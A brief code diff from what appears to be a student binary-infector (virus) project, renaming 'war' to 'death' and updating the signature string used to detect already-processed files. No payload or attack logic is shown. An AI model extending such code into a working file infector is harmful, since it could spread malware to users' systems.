@@ -1,4 +1,4 @@
-#include "war.h"
+#include "death.h"
 
 ssize_t get_file_size(const char *file_name)
 {
@@ -28,7 +28,7 @@ int copy_file(t_woody *woody, char *filename)
 	}
 	char * string = woody->addr;
 	for (int i = 0; i < woody->filesize; i++){
-		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "War version 1.0 (c)oded mar-2023 by jraye-slynell", 49) != NULL){
+		if (woody->filesize - i > 52 && ft_strnstr(&string[i], "Death version 1.0 (c)oded mar-2023 by jraye-slynell", 51) != NULL){
 			close(fd);
 			return ERROR_CODE;
 		}
